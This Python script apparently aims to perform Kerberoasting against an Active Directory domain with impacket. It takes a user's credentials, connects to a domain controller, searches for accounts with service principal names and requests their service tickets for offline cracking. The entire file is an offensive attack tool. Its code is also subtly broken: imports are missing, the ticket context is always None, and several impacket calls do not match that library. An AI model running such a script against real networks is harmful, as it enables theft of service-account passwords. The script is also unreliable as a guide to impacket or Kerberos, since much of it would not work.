from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection

def kerberos_auth(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Initialize a CCache object
        ccache = CCache()

        # Create a principal for the user
        user_principal = Principal(f"{username}@{domain}", type=Principal.NT_PRINCIPAL)

        # Get a TGT for the user
        smb.kerberosLogin(user_principal, password, domain, ccache)

        # Retrieve the TGT from the CCache
        krbtgt = ccache.getCredential(user_principal)

        return krbtgt, None

    except Exception as e:
        print(f"Error during Kerberos authentication: {e}")
        return None, None
def kerberoast(domain, username, password, dc_ip):
    try:
        print(f"Attempting to Kerberoast accounts from {dc_ip}")

        # Get TGT ticket for the specified user
        krbtgt, krbctx = kerberos_auth(username, password, domain, dc_ip)

        if krbtgt:
            print("Successfully obtained krbtgt ticket.")
            
            # Find kerberoastable accounts and request service tickets
            kerberoastable_accounts = find_kerberoastable_accounts(krbctx)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
                    # Request service ticket for the kerberoastable account
                    service_ticket = request_service_ticket(krbctx, krbtgt, account)
                    if service_ticket:
                        print("Service ticket obtained.")
                    else:
                        print("Failed to obtain service ticket.")
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def find_kerberoastable_accounts(krbctx):
    try:
        print("Searching for kerberoastable accounts...")
        
        # Fetch all SPNs from the KDC
        spns = krbctx.queryKDC('', constants.KERB_QUERY_SERVICE_SPN)

        # Extract account names from SPNs
        kerberoastable_accounts = set()
        for spn in spns:
            account_name = spn.split('/')[0]
            kerberoastable_accounts.add(account_name)

        print(f"Found {len(kerberoastable_accounts)} kerberoastable accounts.")

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while searching for kerberoastable accounts: {e}")
        return set()

def request_service_ticket(krbctx, krbtgt, target_user):
    try:
        # Retrieve the service ticket for the target user
        tgt_session_key = krbtgt['KDC_REP']['encrypted_part']['session_key']

        # Build the AP-REQ request
        ap_req = AP_REQ()

        # Set the authenticator
        authenticator = types.EncryptedData()
        authenticator['etype'] = krbtgt['KDC_REP']['encrypted_part']['etype']
        authenticator['cipher'] = krbtgt['KDC_REP']['encrypted_part']['cipher']

        # Pack the AP-REQ request
        ap_req_data = ap_req.getData()

        # Get the service ticket for the target user
        service_ticket = krbctx.getServiceTicket(krbtgt, target_user, sessionKey=tgt_session_key, ap_req=ap_req_data)

        return service_ticket

    except Exception as e:
        print(f"Error while requesting service ticket: {e}")
        return None

# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(domain, username, password, dc_ip)